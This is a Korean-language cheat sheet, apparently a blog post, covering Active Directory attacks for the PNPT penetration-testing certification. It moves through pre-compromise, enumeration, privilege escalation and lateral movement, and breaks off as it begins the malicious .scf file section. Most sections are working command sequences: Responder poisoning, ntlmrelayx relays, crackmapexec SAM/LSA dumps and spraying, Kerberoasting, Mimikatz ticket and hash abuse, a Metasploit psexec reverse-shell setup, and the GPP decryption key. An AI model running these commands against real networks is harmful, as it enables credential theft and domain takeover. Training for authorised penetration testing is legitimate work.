이 글은 TCM Security의 PNPT(Practical Network Penetration Tester) 자격증 취득을 위한 Active Directory 공격 기법 치트시트 이다

실제 시험과 현업 침투 테스트에서 사용되는 흐름 그대로 단계별로 정리하였다

### [AD 공격 흐름]

Active Directory 공격은 크게 아래와 같은 흐름으로 이루어진다

```bash
[외부/내부 네트워크 진입]

1단계. Pre-Compromise
  크리덴셜 없이 네트워크에서 해시/크리덴셜 탈취
  (LLMNR Poisoning, SMB Relay, IPv6 Takeover ...)

[유저 계정 or 해시 획득]

2단계. Post-Compromise Enumeration
  내부 AD 구조 파악 / 공격 경로 탐색
  (BloodHound, PowerView, ldapdomaindump ...)

[공격 대상 / 경로 파악]

3단계. Post-Compromise Attack
  권한 상승 / 횡적 이동
  (Kerberoasting, Pass-the-Hash, Token Impersonation ...)

[높은 권한 계정 확보 or DA 권한]

4단계. Domain Compromise
  도메인 컨트롤러 완전 장악
  (DCSync, Golden Ticket, NTDS.dit 덤프 ...)

5단계. Post-Exploitation & Persistence
  접근 유지 / 횡적 이동 / 흔적 관리
  (Mimikatz, Evil-WinRM, Pivoting ...)
```

특히 AD 공격의 대부분은 이전 단계의 크리덴셜이나 정보를 이용하기 때문에 꼼꼼히 체크하는게 중요하다

### [1단계 : Pre - Compromise (사전 공격)]

Pre-Compromise (사전 공격) 단계에선 크리덴셜 없이 네트워크에 접속 된 상태에서 유저의 해쉬나 크리덴셜을 탈취하는게 목표이다

### [1-1 : LLMNR / NBT - NS Poisoning]

LLMNR과 NBT-NS는 피해자 PC에서 DNS가 모르는 이름으로 서버 요청했을 때 Windows가 로컬 네트워크 전체에 브로드캐스트로 다시 물어보는 프로토콜이다

공격자는 이 브로드캐스트에 거짓으로 응답해서 피해자가 접속을 시도하는 순간 자동으로 전송되는 인증 해시를 탈취해 크리덴셜 확보가 가능해진다

**사용조건:**

```bash
-동일 네트워크에(LAN)에 위치
-피해자가 존재하지 않는 호스트명에 접근을 시도해야 함 (예: 오타로 파일 쉐어 접근)
-LLMNR 또는 NBT-NS가 활성화되어 있어야 함 (Windows 기본값: 활성화)
```

**공격흐름 + 툴 & 명령어 :**

```bash
(공격 흐름)

1.피해자가 \\FIILESRV (오타) 접근 시도
2.DNS 조회 실패
3.LLMNR 브로드캐스트 발송
4.공격자 Responder가 "FIILESRV" 응답
5.피해자가 NTLMv2 해시 전송 (NTLMv2 해시를 크랙해야 크리덴셜 확보)
6.해시 캡처 성공

---------------------------------------------------------------------

(툴 & 명령어)

# Responder 실행 (기본)
sudo responder -I eth0 -dwv

# 옵션 설명
# -I eth0  : 인터페이스 지정
# -d       : DHCP 독
# -w       : WPAD 프록시 서버 활성화
# -v       : 상세 출력

# 분석 모드 (응답 X, 청취만)
sudo responder -I eth0 -A
```

※Responder가 캡한 해시는 /usr/share/responder/logs/에서 확인 가능

※캡쳐한 NTLMv2 해시는 PASS-THE-HASH에 직접 사용 불가능 하기 때문에 반드시 평문 패스워드를 얻거나 SMB relay 로 넘겨야 한다

### [1-2 : SMB Relay Attack]

SMB Relay 공격은 LLMNR Poisoning으로 받은 NTLMv2 해시를 직접 크랙하는 대신 다른 머신(PC)에 실시간으로 중계해 인증하는 공격이다

챌린지값이 매번 바뀌기 때문에 반드시 실시간으로 중계해야 하며 쉽게 말해 중간자 공격(Man in the Middle)이다

**사용조건:**

```bash
-SMB Signing이 비활성화 또는 Not Required인 머신이 존재해야 함
-중계 대상 머신에서 캡처한 유저가 로컬 어드민 권한을 가지고 있어야 함
-LLMNR/NBT-NS가 활성화되어 있어야 함

SMB Signing = 서버의 패킷 위조 검증
```

**공격 흐름 + 툴 & 명령어:**

```bash
(공격 흐름)

1. Responder 설정 수정 (SMB/HTTP 응답 끄기)
2. ntlmrelayx.py 실행 (릴레이 타겟 지정)
3. Responder 실행 (해시 캡처 역할)
4. 피해자가 LLMNR 요청 발송
5. Responder가 응답 → 피해자가 해시 전송
6. ntlmrelayx.py가 해시를 타겟 머신에 중계
7. 타겟 머신 SAM 덤프 or 쉘 획득

--------------------------------------------------------------------------------------------------

(툴 & 명령어)

1 - Responder 설정 수정
# SMB = Off
# HTTP = Off
# (ntlmrelayx가 대신 처리하므로 끄기)
sudo nano /etc/responder/Responder.conf

2 - 타겟 리스트 생성
# SMB Signing 비활성화된 머신 목록을 찾고 저장
nmap --script=smb2-security-mode.nse -p 445 192.168.1.0/24 | grep -B5 "not required" | grep "Nmap scan report" | awk '{print $NF}' > targets.txt

Step 3 - ntlmrelayx.py 실행
# SAM 덤프 모드 = 타겟 서버의 계정 해시 전부 뽑기
sudo ntlmrelayx.py -tf targets.txt -smb2support

# 인터랙티브 쉘 모드 = 타겟 서버의 계정 해시 전부 뽑기
sudo ntlmrelayx.py -tf targets.txt -smb2support -i

# 명령 실행 모드 = 타겟 서버에서 명령어 바로 실행
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

4 - Responder 실행
sudo responder -I eth0 -dwv
```

※ SAM 덤프로 받은 해시는 NT 해시라 PASS-THE-HASH 가능

### [1-3 : IPv6 DNS Takeover (mitm6)]

Windows는 기본적으로 IPv6를 활성화하고 IPv4보다 우선시 한다

여기서 공격자가 가짜 DHCPv6 서버 역할을 해서 네트워크의 기본 DNS 서버로 등록되면 LDAP 릴레이를 통해 도메인 어드민 계정을 생성하여 DC 장악이 가능하다

**사용조건:**

```bash
1.네트워크에서 IPv6이 활성화되어 있어야 함 (Windows 기본값)
2.LDAP Signing이 필수가 아니어야 함
3.DC에 LDAPS(636포트)가 없거나 설정이 미흡해야 함
```

**공격 흐름 + 툴 & 명령어:**

```bash
(공격 흐름)

1.mitm6 실행
2.피해자 머신이 IPv6 DNS를 공격자로 설정 = 가짜 DHCPv6 서버로 DNS 장악
3.피해자가 WPAD 등 조회 시 공격자에게 접속
4.ntlmrelayx.py가 DC의 LDAP으로 릴레이
5.도메인에 새 어드민 계정 생성 or ACL 수정 , ACL = 계정 권한 목록

-------------------------------------------------------------------------

(툴 & 명령어)

터미널 1 - ntlmrelayx.py
# 도메인 어드민 계정 생성
sudo ntlmrelayx.py -6 -t ldaps://[DC-IP] -wh fakewpad.domain.local -l loot
# AD CS 타겟 = 도메인 어드민 인증서 발급
sudo ntlmrelayx.py -6 -t ldaps://[DC-IP] --delegate-access

터미널 2 - mitm6 실행
sudo mitm6 -d domain.local
```

### [1-4 : Password Spraying]

Password Spraying은 계정 잠금 정책을 피하기 위해 여러 계정에 하나의 패스워드를 시도하는 공격이다

**사용 조건:**

```bash
1.유효한 유저명 목록이 있어야 함
2.패스워드 정책 확인 필수 (잠금 임계값 이하로 시도해야 함)
3.흔한 패스워드 알아야 함 (계절+연도, 회사명, Password1! 등)
```

**툴 & 명령어:**

```bash
(공격 흐름)

1.패스워드 정책 확인 (잠금 임계값 파악)
2.유저명 목록 수집 (Kerbrute, enum4linux 등)
3.흔한 패스워드 1개 선택 (예: Password2024!)
4.전체 유저에게 동일 패스워드 시도
5.성공한 계정 → 내부 열거 시작

------------------------------------------------------------------------------------

(유저명 수집 방법)

# Kerbrute로 유저명 열거 (인증 없이)
kerbrute userenum -d domain.local --dc [DC-IP] usernames.txt

# enum4linux
enum4linux -U [DC-IP]

# LDAP = 회사 직원 명부 관리 시스템 (크리덴셜 있을 때)
crackmapexec smb [DC-IP] -u '' -p '' --users

---------------------------------------------------------------------------------------

(패스워드 정책 확인)

crackmapexec smb [DC-IP] -u [user] -p [pass] --pass-pol

-------------------------------------------------------------------------------------

(스프레이 실행)

# Kerbrute (Kerberos 기반, 빠름)
kerbrute passwordspray -d domain.local --dc [DC-IP] usernames.txt "Password2024!"

# CrackMapExec
crackmapexec smb [DC-IP] -u usernames.txt -p "Password2024!" --continue-on-success
```

### [1-5 : WPAD Attack]

Responder의 WPAD 기능을 활용해 가짜 프록시 서버를 만들어 피해자 브라우저가 자동으로 인증하도록 유도하는 공격이다

**사용 조건:**

```bash
1.LLMNR/NBT-NS 활성화
2.피해자가 웹 브라우저 사용 시작
```

**공격 흐름 + 툴 & 명령어:**

```bash
(공격 흐름)

1.Responder -w -F 옵션으로 실행
2.피해자 브라우저가 WPAD 프록시 설정 자동 탐색
3.LLMNR로 "WPAD" 쿼리 브로드캐스트
4.Responder가 "WPAD" 응답
5.브라우저가 프록시 인증 요청 (-F: Basic 인증 강제)
6.평문 크리덴셜 획득

---------------------------------------------------------------

(명령어)

# -w : WPAD 서버 활성화
# -F : Basic 인증 강제 (평문 크리덴셜 획득 가능)
sudo responder -I eth0 -wFv
```

### 

### [2단계 : Post-Compromise Enumeration (내부 열거)]

2단계, 내부 열거 단계에선 AD 내부 구조를 파악하고 공격 경로를 수립하는 단계이다

### [2-1 : BloodHound / SharpHound]

BloodHound나 SharpHound는 AD의 모든 관계(유저, 그룹, 컴퓨터, ACL, GPO 등)를 수집해 그래프로 시각화 해주는 도구이다

**사용조건:**

```bash
1.유효한 도메인 크리덴셜을 보유하고 있어야 함
2.도메인 내부 접근 가능한 상태
```

**공격 흐름 + 툴 & 명령어:**

```bash
(공격 흐름)

1.도메인 유저 크리덴셜 획득 (1단계 결과)
2.SharpHound로 AD 전체 데이터 수집 (ZIP)
3.ZIP을 Kali로 가져와 BloodHound GUI에 임포트
4."Shortest Path to DA" 쿼리 실행
5.공격 경로 파악 → 3단계 공격 선택

----------------------------------------------------------------

(데이터(zip) 수집 (SharpHound))

# Windows 피해자 머신에서 실행
.\SharpHound.exe -c All --domain domain.local --zipfilename bloodhound.zip

# PowerShell 버전
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain domain.local -ZipFileName loot.zip

# Kali에서 원격 실행 (크리덴셜 있을 때)
bloodhound-python -u [user] -p [pass] -ns [DC-IP] -d domain.local -c All --zip

-----------------------------------------------------------------------------

BloodHound GUI 분석

Neo4j 실행: sudo neo4j start
BloodHound 실행 후 ZIP 파일 임포트
주요 쿼리:

"Find Shortest Paths to Domain Admins"
"Find Principals with DCSync Rights"
"List all Kerberoastable Accounts"
"Find Computers where Domain Users are Local Admin"
```

### [2-2 : PowerView]

PowerView는 PowerShell 기반의 AD 툴로 BloodHound 보다 더 세밀한 특정 개체와 권한 분석이 가능하다

**사용조건:**

```bash
1.도메인 유저 권한
```

**공격 흐름 + 툴 & 명령어:**

```bash
(공격 흐름)

1.도메인 유저 계정으로 Windows 머신 접근
2.PowerView.ps1 로드 (. .\PowerView.ps1)
3.도메인 유저/그룹/컴퓨터 전체 열거
4.SPN 설정 계정 탐색 → Kerberoasting 대상 확보
5.사전인증 비활성화 계정 탐색 → AS-REP Roasting 대상 확보
6.Find-LocalAdminAccess → 내가 어드민인 머신 목록 확보
7.ACL 분석 → 잘못된 권한 발견 → 권한 상승 경로 수립 (잘못된 권한 = 불필요하게 과도한 권한이 설정된 계정)

--------------------------------------------------------------------------------------------

(주요 명령어)

# 모듈 로드
. .\PowerView.ps1

# 도메인 기본 정보
Get-NetDomain
Get-DomainSID

# 유저 열거
Get-DomainUser
Get-DomainUser -Identity [username] -Properties *

# 그룹 열거
Get-DomainGroup
Get-DomainGroupMember -Identity "Domain Admins"

# 컴퓨터 열거
Get-DomainComputer
Get-DomainComputer -Properties Name,IPv4Address

# 로컬 어드민 확인 (자신이 어드민인 머신 찾기)
Find-LocalAdminAccess

# SPN 설정된 계정 (Kerberoasting 대상)
Get-DomainUser -SPN

# Kerberos 사전인증 비활성화된 계정 (AS-REP Roasting 대상)
Get-DomainUser -PreauthNotRequired

# ACL 분석
Invoke-ACLScanner -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "Domain Users"}

# 쉐어 탐색
Invoke-ShareFinder
```

### [2-3 : ldapdomaindump]

ldapdomaindump는 LDAP 프로토콜로 AD에 직접 쿼리해서 정보를 긁어오는 Python 툴이다

**사용조건:**

```bash
1.유효한 도메인 크리덴셜
```

**공격 흐름 + 툴 & 명령어:**

```bash
(공격 흐름)

1.도메인 크리덴셜 획득
2.ldapdomaindump 실행 → HTML/JSON 파일 생성
3.domain_users.html → 유저 목록, 어드민 계정, 설명 필드 확인
4.domain_groups.html → DA 그룹 멤버 확인
5.domain_policy.html → 패스워드 정책 확인 (스프레이 시 잠금 임계값 파악)
6.수집된 정보 → 이후 공격 대상 선정

------------------------------------------------------------------------------------

(명령어)

ldapdomaindump [DC-IP] -u 'domain.local\[user]' -p '[password]' -o ./loot/

# 결과 파일들:
# domain_users.html     → 모든 유저 정보
# domain_groups.html    → 그룹 정보
# domain_computers.html → 컴퓨터 목록
# domain_policy.html    → 패스워드 정책
```

### [2-4 : CrackMapExec (CME / NetExec)]

CME와 NetExec은  SMB,WinRm,LDAP,RDP 등 다양한 프로토콜로 네트워크 전체를 스캔하고 크리덴셜 테스트,정보 수집, 명령어 실행까지 가능하도록 만든 툴이다

**사용조건:**

```bash
1.유효한 크리덴셜 또는 해시
2.대상 포트 접근 가능
```

**공격 흐름 + 툴 & 명령어:**

```bash
(공격 흐름)

1.크리덴셜 or 해시 획득
2.네트워크 전체 대역에 크리덴셜 테스트
3.(Pwn3d!) 표시 머신 = 로컬 어드민 접근 가능 ([+] = 로그인만 됨 (Pwn3d!) = 로컬 어드민 권한)
4.--sam / --lsa 로 해당 머신 해시를 꺼냄(덤프)
5.덤프한 해시로 다시 네트워크 전체 테스트 (Pass-the-Hash)
6.추가 Pwn3d! 머신 발견 → 반복 (해시 체인)
7.DA 해시 획득 시 → DC 접근

-------------------------------------------------------------------------

(주요 명령어)

# 크리덴셜 검증
crackmapexec smb 192.168.1.0/24 -u [user] -p [pass] -d domain.local

# 로컬 어드민 확인 (Pwn3d! 표시)
crackmapexec smb 192.168.1.0/24 -u [user] -p [pass] --local-auth

# SAM 덤프
crackmapexec smb [IP] -u [user] -p [pass] --sam

# LSA Secrets 덤프
crackmapexec smb [IP] -u [user] -p [pass] --lsa

# 패스워드 없이 해시로 (Pass-the-Hash)
crackmapexec smb 192.168.1.0/24 -u [user] -H [NTLM-hash] --local-auth

# 세션 확인
crackmapexec smb 192.168.1.0/24 -u [user] -p [pass] --sessions

# 쉐어 열거
crackmapexec smb [IP] -u [user] -p [pass] --shares

# WinRM으로 명령 실행
crackmapexec winrm [IP] -u [user] -p [pass] -x 'whoami'
```

### [2-5 : enum4linux / rpcclient]

SMB Null 세션이나 크리덴셜을 통해 유저/그룹/패스워드 정책을 열거 할 수 있도록 도와주는 툴이다

**사용조건:**

```bash
SMB Null 세션 허용 (크리덴셜 없이) 또는 유효한 크리덴셜
```

**공격 흐름 + 툴 & 명령어:**

```bash
(공격 흐름)

1.크리덴셜 없이 또는 획득한 크리덴셜로 DC에 접근
2.enum4linux -a 로 전체 정보 한번에 수집
3.유저 목록 → Password Spraying 또는 Kerberoasting 대상
4.패스워드 정책 → 잠금 임계값 파악 (스프레이 시 중요)
5.그룹 정보 → DA 그룹 멤버 파악
6.공유 목록 → 접근 가능한 쉐어 확인

------------------------------------------------------------

(명령어)

# enum4linux
enum4linux -a [IP]
enum4linux -U [IP]  # 유저만
enum4linux -P [IP]  # 패스워드 정책만

# rpcclient (크리덴셜 없이)
rpcclient -U "" -N [IP]
> enumdomusers      # 유저 열거
> enumdomgroups     # 그룹 열거
> getdompwinfo      # 패스워드 정책

# rpcclient (크리덴셜 있을 때)
rpcclient -U "domain.local\[user]%[pass]" [IP]
```

### [2-6 : Kerbrute (유저명 열거)]

Kerbrute는 kerberos 프로토콜을 활용해 계정 잠금없이 유효한 유저명을 얻을 수 있도록 도와주는 툴이다

**사용조건:**

```bash
1.DC에 Kerberos 포트(88) 접근 가능
2.유저명 wordlist 보유
```

**공격 흐름 + 툴 & 명령어:**

```bash
(공격 흐름)

1.유저명 wordlist 준비 (흔한 이름 목록, 회사 이름 패턴 등)
2.Kerbrute userenum 으로 유효한 유저명만 필터링
3.계정 잠금 없이 확인 가능 (Kerberos AS-REQ 오류코드 이용)
4.유효 유저 목록 확보
5.Password Spraying 또는 AS-REP Roasting 대상으로 활용

-------------------------------------------------------------------------

(명령어)

# 유저명 열거
kerbrute userenum -d domain.local --dc [DC-IP] usernames.txt -o valid_users.txt

# 패스워드 스프레이
kerbrute passwordspray -d domain.local --dc [DC-IP] valid_users.txt "Password1"
```

### [2-7 : GPO/SYSVOL 탐색]

종종 도메인의 모든 인증 유저가 읽을 수 있는 SYSVOL 공유 폴더에 과거 GPP로 저장된 암호화 패스워드가 남아 있을 가능성이 있다

※GPP = GPP는 관리자가 도메인 전체 PC에 설정을 배포 하는 것이다 (가끔씩 GPP로 계정을 만들 때 비밀번호 까지 같이 설정하고 이 설정이 XML파일로 SYSVOL에 저장되는 경우가 있기 때문에 취약점이 될 수 있음)

**사용조건:**

```bash
1.유효한 도메인 유저 크리덴셜
2.과거에 GPP로 패스워드가 설정된 환경
```

**공격 흐름 + 툴 & 명령어:**

```bash
(공격 흐름)

1.도메인 유저 계정으로 SYSVOL 접근 (모든 인증 유저 읽기 가능)
2.SYSVOL\[domain]\Policies 하위 Groups.xml 파일 탐색
3.cPassword 필드 발견
4.gpp-decrypt 또는 CrackMapExec gpp_password 모듈로 복호화
5.평문 패스워드 획득 (로컬 어드민 or DA인 경우 많음)
6.해당 계정으로 추가 공격 진행

------------------------------------------------------------------

(명령어)

# Kali에서
crackmapexec smb [DC-IP] -u [user] -p [pass] -M gpp_password

# PowerView에서
Get-GPPPassword

# 수동 탐색
smbclient //[DC-IP]/SYSVOL -U [user]
# Groups.xml 파일 찾기
find . -name "Groups.xml" 2>/dev/null

# cPassword 복호화
gpp-decrypt [cPassword값]
```

### [3단계 : Post-Compromise Attack (사후 공격)]

사후 공격 단계에선 앞서 획득한 일반 유저 계정에서 더 높은 권한으로 상승하거나 도메인 어드민에 근접 하는 것이 주 목표이다

### [3-1 : Kerberoasting]

kerberoasting은 SPN(Service Principal Name)이 설정된 서비스 계정에 대해 TGS 티켓을 요청하고 티켓의 암호화된 부분을 오프라인으로 크랙해 서비스 계정 패스워드를 획득하는 공격이다

1.서비스 계정만 SPN이 설정이 가능

2.TGT 티켓은 일반 유저면 발급 가능

3.TGT를 인증 할 경우 SPN이 설정 된 계정에 대해 TGS 요청 가능

4.TGS는 서비스 계정 패스워드 해시로 암호화되어 있음 → 오프라인 크랙 가능

※TGT(Ticket Granting Ticket)는 Kerberos 인증 시스템에서 로그인 시 발급되는 티켓으로 도메인 내 서비스에 접근할 때 신원을 증명하는 용도로 사용된다

**사용조건:**

```bash
1.도메인 유저 크리덴셜 보유 (권한 낮아도 됨)
2.SPN이 설정된 서비스 계정 존재
3.서비스 계정 패스워드가 약할 때 효과적
```

**공격 흐름 + 툴 & 명령어:**

```bash
(공격 흐름)

1.도메인 유저 계정으로 로그인
2.SPN 설정된 서비스 계정 탐색 (GetUserSPNs, BloodHound)
3.해당 서비스 계정 TGS 티켓 요청 (합법적인 Kerberos 요청)
4.TGS 티켓 추출 (서비스 계정 해시로 암호화된 부분 포함)
5.오프라인으로 Hashcat 크랙
6.서비스 계정 평문 패스워드 획득
7.해당 계정으로 추가 공격 or DA이면 바로 도메인 장악

-------------------------------------------------------------------------------------------

(대상 계정 탐색)

# Kali에서 (Impacket)
GetUserSPNs.py domain.local/[user]:[pass] -dc-ip [DC-IP]

# PowerView에서
Get-DomainUser -SPN | Select SamAccountName, ServicePrincipalName

# BloodHound (GUI)
Queries 탭 → "List all Kerberoastable Accounts" 클릭
→ SPN 설정된 계정 목록 시각화

------------------------------------------------------------------------------------------

(공격 실행)

# 해시 추출 (Impacket)
GetUserSPNs.py domain.local/[user]:[pass] -dc-ip [DC-IP] -request -outputfile kerberoast.txt

# Rubeus (Windows)
.\Rubeus.exe kerberoast /outfile:hashes.txt

------------------------------------------------------------------------------------------------

(해시 크랙)

hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
# -m 13100 = Kerberos 5 TGS-REP etype 23

john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt
```

### [3-2 : AS-REP Roasting]

AS-REP Roasting을 이용하면 사전 인증 (Pre-Authentication)이 비활성화된 계정에 유효한 패스워드 없이 TGT 일부를 요청 할 수 있다

**사용조건:**

```bash
1."Do not require Kerberos preauthentication" 옵션이 활성화된 계정 존재
2.인증 없이도 공격 가능하지만 크리덴셜 있으면 더 많은 대상 탐색 가능
```

**공격 흐름 + 툴 & 명령어:**

```bash
(공격 흐름)

1.사전 인증 비활성화 계정 탐색 (PowerView, BloodHound)
2.해당 계정에 인증 없이 AS-REQ 요청
3.KDC가 TGT 일부를 계정 해시로 암호화해서 반환 (AS-REP)
4.암호화된 부분 추출
5.오프라인 Hashcat 크랙 (-m 18200)
6.계정 패스워드 획득

------------------------------------------------------------------------

(대상 탐색)

# Impacket (인증 없이)
GetNPUsers.py domain.local/ -no-pass -usersfile usernames.txt -dc-ip [DC-IP]

# Impacket (크리덴셜 있을 때)
GetNPUsers.py domain.local/[user]:[pass] -dc-ip [DC-IP] -request

# PowerView
Get-DomainUser -PreauthNotRequired

-------------------------------------------------------------------------------

(해시 크랙)

hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
# -m 18200 = Kerberos 5 AS-REP etype 23
```

### [3-3 : Pass-the-Hash (PtH)]

PtH 공격은 NTLM 해시를 사용해 평문 패스워드 없이 인증하는 기법이다

(SAM 덤프나 Mimikatz로 획득한 해시 등등)

※Responder로 캡쳐한 NTLMv2 해시는 안됨

**사용조건:**

```bash
1.NTLM 해시 보유 (NTLMv2 해시는 불가, NTLM 해시만 가능)
2.타겟 머신에서 SMB/WinRM 등이 열려 있어야 함
3.해당 계정이 타겟에 로컬 어드민 또는 도메인 어드민이어야 함
```

**공격 흐름 + 툴 & 명령어:**

```bash
(공격 흐름)

1.SAM 덤프 or Mimikatz로 NTLM 해시 획득
2.해시 그대로 CrackMapExec / psexec.py에 입력
3.타겟 머신이 NTLM 인증 수락
4.쉘 or 명령 실행 권한 획득
5.추가 해시 덤프 or 횡적 이동

---------------------------------------------------------

(공격 실행)

# CrackMapExec
crackmapexec smb [IP] -u [user] -H [NTLM-hash] --local-auth

# psexec.py (Impacket)
psexec.py [user]@[IP] -hashes :[NTLM-hash]

# wmiexec.py (Impacket)
wmiexec.py [user]@[IP] -hashes :[NTLM-hash]

# evil-winrm (WinRM)
evil-winrm -i [IP] -u [user] -H [NTLM-hash]

-형식: -hashes [LM해시]:[NT해시]
-LM해시가 없으면 앞을 비워두고 콜론 붙임 : :[NT해시]
```

### [3-4 : Pass-the-Ticket (PtT)]

PtT는 메모리에서 kerberos 티켓(TGS 또는 TGT)을 추출해 다른 시스템 인증에 재사용 하는 공격이다

**사용조건:**

```bash
1.시스템에 다른 유저의 활성 세션이 존재해야 함
# 티켓은 메모리에 로그인 되어 있는 상태에만 존재 = 사용자 로그 아웃 시 티켓 사라짐
# 즉 현재 그 PC에 사용자가 로그인 중이여야 함

2.SYSTEM 또는 관리자 권한 필요 (메모리 접근)
# 티켓은 lsass 프로세스 메모리에 저장됨
# lsass는 windows 핵심 프로세스라 아무나 접근 불가능
# SYSTEM이나 관리자 권한이 필요함
```

**공격 흐름 + 툴 & 명령어:**

```bash
(공격 흐름)

1. 어드민 or SYSTEM 권한 획득
2.klist로 현재 시스템에 캐시된 Kerberos 티켓 확인
3.Mimikatz / Rubeus로 메모리에서 티켓 추출 (.kirbi)
4.탈취한 티켓을 현재 세션에 주입 (kerberos::ptt)
5.주입된 티켓 권한으로 네트워크 리소스 접근

-----------------------------------------------------------------

(공격 실행)

# Mimikatz로 티켓 추출 (Windows)
1.mimikatz.exe 실행
2.privilege::debug (권한 상승)
3.sekurlsa::tickets /export (티켓 추출 + .kirbi 파일 저장)
4.kerberos::ptt [파일명.kirbi] (티켓 주입)
5.klist (주입 확인)

# Rubeus로 추출
.\Rubeus.exe dump /nowrap

# 티켓 주입 (Mimikatz)
mimikatz # kerberos::ptt [ticket.kirbi]

# Rubeus로 주입
.\Rubeus.exe ptt /ticket:[base64-ticket]

# 주입 확인
klist
```

### 

### [3-5 : Overpass-the-Hash (OPtH)]

NTLM 해시를 Kerberos 인증에 활용해 TGT를 발급받는 기법이다

중간점검:

```bash
PtH VS oPtH

PtH와 oPtH는 둘다 NTLM 해시를 사용한다는 점에서 같지만 PtH는 NTLM, oPtH는 Kerberos 인증방식을
쓰기 때문에 oPtH가 PtH보다 훨씬 유용하다
하지만 도메인이 아닌 로컬 계정의 크리덴셜만 있을 때나 88번(Kerberos)포트가 막혀 있을 땐 PtH만 가능하다
```

**사용조건:**

```bash
1.NTLM 해시 보유
2.Kerberos 인증 환경
```

**공격 흐름 + 툴 & 명령어:**

```bash
(공격 흐름)

1.NTLM 해시 획득 (SAM 덤프, Mimikatz 등)
2.NTLM 해시를 RC4 키로 사용해 KDC에 TGT 요청
3.KDC가 정상 TGT 발급 (해시가 올바르면 통과)
4.발급된 TGT로 Kerberos 기반 인증 가능
5.도메인 내 서비스 접근 (NTLM이 막힌 환경에서도 유효)

-----------------------------------------------------------

(공격 실행)

# Mimikatz
1.mimikatz.exe 실행
2.privilege::debug
3.sekurlsa::pth /user:[user] /domain:[domain] /ntlm:[hash] /run:cmd.exe

# Rubeus
.\Rubeus.exe asktgt /user:[user] /rc4:[NTLM-hash] /ptt
```

### 

### [3-6 : Token Impersonation]

원래 windows는 실행 중인 프로세스에 토큰을 부여하며 다른 유저의 토큰을 이용해 해당 유저 권한으로 작업이 가능하다

하지만 Token Impersonation 공격은 이를 이용하여 DA가 열어둔 세션의 토큰을 탈취해 DA 권한을 획득하는 공격이다

**사용조건:**

```bash
1.로컬 어드민 또는 SYSTEM 권한 보유
2.타겟 유저가 해당 시스템에 활성 세션 또는 프로세스 보유
```

**공격 흐름 + 툴 & 명령어:**

```bash
(공격 흐름)

1.로컬 어드민 or SYSTEM 권한으로 머신 접근
2.list_tokens -u 로 현재 시스템의 토큰 목록 확인
3.DA or 높은 권한 계정 토큰 발견
4.impersonate_token으로 해당 토큰 탈취
5.whoami → DA 권한으로 전환됨
6.DC 접근 or 추가 공격 진행

---------------------------------------------------------------

(공격 실행)

1.msfconsole
2.use exploit/windows/smb/psexec
3.set payload windows/x64/meterpreter/reverse_tcp
4.set RHOSTS [IP]
5.set SMBUser [user]
6.set SMBPass [pass]
7.run

# 미터프리터에서
load incognito
list_tokens -u                         # 사용 가능한 토큰 확인
impersonate_token "DOMAIN\\Administrator"  # 토큰 탈취
shell
whoami
```

### [3-7 : GPP / cPassword Attack (MS14-025)]

※두번째 설명

구버 Group Policy Preferences(GPP)는 관리자가 도메인 내 머신들에 로컬 계정 패스워드, 서비스 계정, 드라이브 매핑 등을 일괄 설정하는 기능이었다

이때 패스워드를 AES-256으로 암호화해서 SYSVOL에 저장했는데 2012년 Microsoft가 MSDN에 암호화 키를 그대로 공개해버렸고 덕분에 누구든 복호화 가능해졌다

Microsoft는 2014년 MS14-025 패치로 GPP에 새 패스워드를 저장하는 기능을 막았지만 패치 전에 생성된 파일은 여전히 SYSVOL에 남아있을 수 있다

**AES 복호화 키:**

```bash
4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b
```

**사용조건:**

```bash
1.도메인 유저 크리덴셜 보유 (SYSVOL은 모든 인증 유저 읽기 가능)
2.구버전 환경이거나 과거에 GPP로 패스워드 설정한 이력이 있어야 함
3.MS14-025 이전에 생성된 GPP 파일이 남아있어야 함
```

**공격 흐름 + 툴 & 명령어:**

```bash
(공격 흐름)

1.도메인 유저 계정으로 SYSVOL 접근 (모든 인증 유저 읽기 가능)
2.\\[DC]\SYSVOL\[domain]\Policies 하위 전체 탐색
3.Groups.xml, Services.xml 등에서 cPassword 필드 탐색
4.cPassword 값 복사
5.gpp-decrypt로 복호화 (MS가 유출한 AES 키 사용)
6.평문 패스워드 획득
7.보통 로컬 Administrator 계정인 경우가 많음
8.Pass-the-Password 또는 Pass-the-Hash로 네트워크 전체 전파

------------------------------------------------------------------------

(공격 실행)

# CrackMapExec 자동화 (가장 빠름)
crackmapexec smb [DC-IP] -u [user] -p [pass] -M gpp_password

# Metasploit
use post/windows/gather/credentials/gpp

# 수동 - smbclient로 SYSVOL 탐색
smbclient //[DC-IP]/SYSVOL -U [user]%[pass]
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
1.로컬에 전체 다운로드 후 탐색
grep -r "cpassword" .
2.gpp-decrypt로 복호화
gpp-decrypt [cPassword값]
3.PowerView (Windows에서)
Get-GPPPassword
4.find로 특정 파일만 탐색
find /tmp/sysvol -name "*.xml" | xargs grep -l "cpassword" 2>/dev/null

-------------------------------------------------------------------------------

(획득 후 활용)

# 보통 로컬 어드민 패스워드인 경우 → 네트워크 전체 전파
crackmapexec smb 192.168.1.0/24 -u Administrator -p [복호화된 패스워드] --local-auth

# Pwn3d! 뜨는 머신 → SAM 덤프 → 추가 해시 확보
crackmapexec smb [IP] -u Administrator -p [pass] --local-auth --sam
```

### [3-8 : URL File / SCF File Attack (Watering Hole)]

네트워크 공유 폴더에 악성 .url 또는 .scf 파일을 배치해 유저가 탐색기로 폴더를 열기만 해도 자동으로 NTLM 해시를 Responder로 전송시키는 공격이다

**사용조건:**

```bash
1.쓰기 권한이 있는 네트워크 쉐어 존재
2.유저들이 해당 쉐어를 탐색하는 환경
```

**공격 흐름 + 툴 & 명령어:**

```bash
(공격 흐름)

1.Responder 실행 (해시 수신 대기)
2.쓰기 가능한 네트워크 쉐어 탐색 (CrackMapExec --shares)
3.쉐어에 @exploit.scf 또는 @exploit.url 파일 배치
4.유저가 파일 탐색기로 폴더 열기만 해도 자동 트리거
5.파일이 공격자 IP의 아이콘/리소스 요청
6.NTLMv2 해시 자동 전송
7.Responder가 해시 캡처

--------------------------------------------------------------------------

(악성 파일 생성)

 # .scf 파일 (바탕화면 아이콘 파일)
